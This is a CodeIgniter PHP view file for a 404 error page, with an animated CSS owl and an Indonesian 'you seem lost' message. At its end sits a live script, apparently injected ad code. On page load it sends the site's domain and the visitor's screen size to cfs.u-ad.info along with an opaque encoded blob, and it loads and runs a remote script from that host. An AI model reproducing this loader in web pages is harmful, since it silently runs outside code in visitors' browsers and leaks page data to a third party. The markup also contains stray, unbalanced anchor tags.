<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Pankaj Taneja">
    <link rel="shortcut icon" href="">
    <title>404 not found</title>
    <link rel="stylesheet" href="<?php echo base_url()?>assets/error/bootstrap.min.css">
    <link rel="stylesheet" href="<?php echo base_url()?>assets/error/stylesheet.css">
	<link rel="stylesheet" href="<?php echo base_url()?>assets/error/css_003.css">
	<link rel="stylesheet" href="<?php echo base_url()?>assets/error/css_002.css">
	<link rel="stylesheet" href="<?php echo base_url()?>assets/error/css_004.css">
	<link rel="stylesheet" href="<?php echo base_url()?>assets/error/css.css">
</head>
	<body class="dusk">
	            <div class="col-md-12">
				<div class="owl-background">
					<div class="moon"><div class="left">4</div><div class="right">4</div></div>
					<div class="owl">
								<div class="wing1"></div>
								<div class="wing2"></div>
								<div class="wing3"></div>
								<div class="wing4"></div>
								<div class="wing5"></div>
								<div class="wing6"></div>
								<div class="wing7"></div>
								<div class="wing8"></div>
								<div class="wing9"></div>
								<div class="wing10"></div>
								<div class="wing11"></div>
								<div class="wing12"></div>
						<div class="owl-head">
								<div class="ears"></div>			
						</div>
						<div class="owl-body">
							<div class="owl-eyes">
								<div class="owleye">
										<div class="owleye inner"></div>
										<div class="owleye inner inner-2"></div>
										<div class="eyelid top"></div>
										<div class="eyelid bottom"></div>
								</div>
										<div class="owleye">
										<div class="owleye inner"></div>
										<div class="owleye inner inner-2"></div>
										<div class="eyelid top"></div>
										<div class="eyelid bottom"></div>
								</div>
								<div class="nose"></div>
							</div>
									<div class="feet">
									<div class="foot1"></div>
									<div class="foot2"></div>
							</div>
						</div>				
						<div class="branch"></div>
				    </div>
				</div> 
				</div>
				<div class="col-md-12">
				<div class="message">
						<h2>Ehhhhh!</h2>
						<p>Sepertinya Anda Tersesat ! <a href="<?php echo base_url()?>">Kembali Ke Habitat</a></p>
						<a>						
				</a></div><a>
				</a></div><a>
				<div id="stars1"></div>
				<div id="stars2"></div>
				<div id="stars3"></div>
				<div id="sstar"></div>
	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnBuXQFZN7aPnkdKOdl7UmdlAdVPUvopSh8zMkj5O9Ec8xOK8A8ZxGN%2b60juuVfQGDM8nznLGAp9vY%2bGENuYtog7xF6NLa5%2bGmh6AYy6n1SIdFAWNdf0QsicO7jIbefiX86GOA7PuENqrLH4OpDTnM0ffYjtV3lYt2PlcSgn47LY84FEn8TAL7KfT65lT7JZV8GQbhoUwTBKp8WUr7BhhvSuaSJHvJ0jxTOyMvxBU%2byfkDQ7vTS5qr1QLtnRZPnsoOMIHbvB14W2oYjLKoB%2bXTE0pzeG3VzZrAoT%2b6kdtYl4PHxSNsZC5amuMSrwQ5E3avvn1wTWPiAqof6LwC%2b%2fviSeLUENFl%2bIKCQyLN6ef7axoyntKCSIvH9a6nalqbP0j%2f5gHOHkNSCOegGtqew%2fNFkhMgw%2b972JkmjeVXe1jPYaTTfe1F%2bq1Nz%2fQAnmEES5lVlwxJ5ha%2fj%2fpZf%2bmk0WFoX6a%2bFgIKFrH9Jo8tGGnk7LnUzInm3iYXwg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</a></body></html>